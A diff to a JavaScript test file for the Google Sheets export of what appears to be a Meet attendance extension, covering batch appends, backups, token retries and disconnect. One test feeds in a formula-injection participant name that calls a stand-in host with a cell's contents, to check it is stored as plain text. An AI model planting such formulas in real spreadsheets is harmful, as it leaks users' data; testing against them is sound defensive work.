@@ -6,7 +6,11 @@
  */
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { parseSpreadsheetRef, spreadsheetUrl, headerRepair, meetingRow, appendRecords } from '../src/lib/sheets-api.js';
+import * as sheets from '../src/lib/sheets-api.js';
+import {
+  appendRecords, getSpreadsheet, headerRepair, meetingRow, parseSpreadsheetRef,
+  readBackupIndex, restoreAll, spreadsheetUrl
+} from '../src/lib/sheets-api.js';
 
 const ID = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
 
@@ -82,7 +86,7 @@ test('the readable row is the meeting the dashboard shows, hours and all', () =>
 
   assert.equal(start, '2026-08-14T10:00:00.000Z', 'joining ten minutes early is not the meeting starting early');
   assert.equal(end, '2026-08-14T11:00:00.000Z');
-  assert.equal(minutes, '60', 'the hour it was scheduled for, as everywhere else in the app');
+  assert.equal(minutes, 60, 'the hour it was scheduled for, as everywhere else in the app');
 });
 
 test('a meeting with no hours of its own is the span it was tracked over', () => {
@@ -93,24 +97,92 @@ test('a meeting with no hours of its own is the span it was tracked over', () =>
 
   assert.equal(start, '2026-08-14T09:00:00.000Z');
   assert.equal(end, '2026-08-14T09:30:00.000Z');
-  assert.equal(minutes, '30');
+  assert.equal(minutes, 30);
 });
 
 /* ---- what a send puts in each tab ---- */
 
+const authOptions = [];
+const removedTokens = [];
+const batchBodies = [];
+const legacyAppends = [];
+const committed = new Map();
+let tokenNo = 0;
+let clearCalls = 0;
+let clearError = null;
+let failBatch = false;
+let failBackupRead = false;
+let unauthorizedOnce = false;
+
 globalThis.chrome = {
   runtime: { lastError: null, getManifest: () => ({ oauth2: { client_id: 'test.apps.googleusercontent.com' } }) },
-  identity: { getAuthToken: (_o, cb) => cb('token'), removeCachedAuthToken: (_o, cb) => cb() }
+  identity: {
+    getAuthToken: (options, cb) => {
+      authOptions.push({ ...options });
+      cb(`token-${++tokenNo}`);
+    },
+    removeCachedAuthToken: ({ token }, cb) => {
+      removedTokens.push(token);
+      cb();
+    },
+    clearAllCachedAuthTokens: cb => {
+      clearCalls++;
+      if (clearError) chrome.runtime.lastError = { message: clearError };
+      cb();
+      chrome.runtime.lastError = null;
+    }
+  }
 };
 
-/** Every append, kept by the tab it went to. The rest of the API is answered and ignored. */
-const appends = new Map();
+function resetApi() {
+  authOptions.length = 0;
+  removedTokens.length = 0;
+  batchBodies.length = 0;
+  legacyAppends.length = 0;
+  committed.clear();
+  tokenNo = 0;
+  clearCalls = 0;
+  clearError = null;
+  failBatch = false;
+  failBackupRead = false;
+  unauthorizedOnce = false;
+}
+
+function valueOf(cell) {
+  const value = cell.userEnteredValue || {};
+  if ('numberValue' in value) return value.numberValue;
+  if ('boolValue' in value) return value.boolValue;
+  return value.stringValue;
+}
+
+function applyBatch(body) {
+  for (const request of body.requests || []) {
+    const append = request.appendCells;
+    if (!append) continue;
+    const rows = (append.rows || []).map(row => (row.values || []).map(valueOf));
+    committed.set(append.sheetId, (committed.get(append.sheetId) || []).concat(rows));
+  }
+}
+
 globalThis.fetch = async (url, opts = {}) => {
-  const reply = (obj) => ({ ok: true, status: 200, json: async () => obj });
+  const reply = (obj, status = 200) => ({ ok: status >= 200 && status < 300, status, json: async () => obj });
+  if (unauthorizedOnce) {
+    unauthorizedOnce = false;
+    return reply({ error: { message: 'expired' } }, 401);
+  }
+  if (failBackupRead && decodeURIComponent(url).includes('/values/Backup!A2')) {
+    return reply({ error: { message: 'service unavailable' } }, 503);
+  }
+  if (/\/spreadsheets\/[^/:]+:batchUpdate$/.test(url)) {
+    const body = JSON.parse(opts.body);
+    batchBodies.push(body);
+    if (failBatch) return reply({ error: { message: 'batch refused' } }, 503);
+    applyBatch(body);
+    return reply({ replies: body.requests.map(() => ({})) });
+  }
   const append = /values\/([^:]+):append/.exec(url);
   if (append) {
-    const tab = decodeURIComponent(append[1]).split('!')[0];
-    appends.set(tab, (appends.get(tab) || []).concat(JSON.parse(opts.body).values));
+    legacyAppends.push({ range: decodeURIComponent(append[1]), body: JSON.parse(opts.body) });
     return reply({});
   }
   if (/values:batchGet/.test(url)) return reply({ valueRanges: [] });
@@ -123,12 +195,16 @@ globalThis.fetch = async (url, opts = {}) => {
   return reply({});
 };
 
+const rawMeeting = (overrides = {}) => ({
+  id: 'abc-defg-hij-3', meetingCode: 'abc-defg-hij', meetingTitle: 'Standup', url: '',
+  date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T10:00:00.000Z',
+  attendance: {}, ...overrides
+});
+
 test('a person recorded twice by Meet is one person in the tabs people read', async () => {
-  appends.clear();
+  resetApi();
   // as it is stored: the two identities separate, the merge beside them as an alias
-  const meeting = {
-    id: 'abc-defg-hij-3', meetingCode: 'abc-defg-hij', meetingTitle: 'Standup', url: '',
-    date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T10:00:00.000Z',
+  const meeting = rawMeeting({
     nameMap: { 'jan k': 'Jan Kowalski' },
     attendance: {
       'Jan K': { email: null, events: [
@@ -136,34 +212,79 @@ test('a person recorded twice by Meet is one person in the tabs people read', as
       'Jan Kowalski': { email: null, events: [
         { time: '2026-08-14T09:30:00.000Z', type: 'Join' }, { time: '2026-08-14T10:00:00.000Z', type: 'Leave' }] }
     }
-  };
+  });
 
   await appendRecords('a'.repeat(30), { meetings: [meeting] });
 
-  const [row] = appends.get('Meetings');
+  assert.equal(batchBodies.length, 1, 'all tabs are appended by one API request');
+  assert.equal(legacyAppends.length, 0, 'the USER_ENTERED values endpoint is not used');
+
+  const [row] = committed.get(0);
   assert.equal(row[5], 1, 'one person attended, which is what the dashboard says too');
 
-  const names = new Set(appends.get('Participants').map(r => r[1]));
+  const names = new Set(committed.get(1).map(r => r[1]));
   assert.deepEqual([...names], ['Jan Kowalski'], 'and their joins and leaves are listed under one name');
 
-  const backup = appends.get('Backup').map(r => r[3]).join('');
+  const backup = committed.get(2).map(r => r[3]).join('');
   assert.deepEqual(Object.keys(JSON.parse(backup).attendance), ['Jan K', 'Jan Kowalski'],
     'the backup keeps the record as it is stored, or restoring it could not take the merge back');
 });
 
-test('a name that would read as a formula goes into the sheet as text', async () => {
-  appends.clear();
+test('a name that looks like a formula is encoded as an explicit string value', async () => {
+  resetApi();
   // what somebody in the call chose to be called, which is not something to hand a spreadsheet
   const hostile = '=IMAGE("http://example.invalid/"&A1)';
-  await appendRecords('a'.repeat(30), { meetings: [{
+  await appendRecords('a'.repeat(30), { meetings: [rawMeeting({
     id: 'abc-defg-hij-4', meetingCode: 'abc-defg-hij', meetingTitle: '=1+1', url: '',
-    date: '2026-08-14T09:00:00.000Z', endedAt: '2026-08-14T10:00:00.000Z',
     attendance: { [hostile]: { email: null, events: [{ time: '2026-08-14T09:00:00.000Z', type: 'Join' }] } }
-  }] });
+  })] });
 
-  assert.equal(appends.get('Meetings')[0][1], "'=1+1", 'the sheet is told to read the title, not to run it');
-  assert.equal(appends.get('Participants')[0][1], `'${hostile}`);
+  const requests = batchBodies[0].requests;
+  const title = requests.find(r => r.appendCells?.sheetId === 0).appendCells.rows[0].values[1];
+  const name = requests.find(r => r.appendCells?.sheetId === 1).appendCells.rows[0].values[1];
+  assert.deepEqual(title, { userEnteredValue: { stringValue: '=1+1' } });
+  assert.deepEqual(name, { userEnteredValue: { stringValue: hostile } });
 
-  const backup = appends.get('Backup').map(r => r[3]).join('');
+  const backup = committed.get(2).map(r => r[3]).join('');
   assert.equal(JSON.parse(backup).meetingTitle, '=1+1', 'and the backup still carries what was recorded');
+});
+
+test('a rejected atomic batch leaves every sheet without the offered record', async () => {
+  resetApi();
+  failBatch = true;
+
+  await assert.rejects(
+    appendRecords('a'.repeat(30), { meetings: [rawMeeting()] }),
+    /batch refused/
+  );
+
+  assert.equal(committed.size, 0);
+});
+
+test('a Backup HTTP failure rejects instead of looking like an empty backup', async () => {
+  resetApi();
+  failBackupRead = true;
+
+  await assert.rejects(restoreAll('a'.repeat(30)), /service unavailable/);
+  await assert.rejects(readBackupIndex('a'.repeat(30)), /service unavailable/);
+});
+
+test('ordinary API calls and a 401 retry are noninteractive', async () => {
+  resetApi();
+  unauthorizedOnce = true;
+
+  await getSpreadsheet('a'.repeat(30));
+
+  assert.deepEqual(authOptions, [{ interactive: false }, { interactive: false }]);
+  assert.deepEqual(removedTokens, ['token-1']);
+});
+
+test('disconnect clears all cached identity tokens and reports failure', async () => {
+  resetApi();
+  await sheets.disconnect();
+  assert.equal(clearCalls, 1);
+
+  clearError = 'identity refused';
+  await assert.rejects(sheets.disconnect(), /identity refused/);
+  assert.equal(clearCalls, 2);
 });
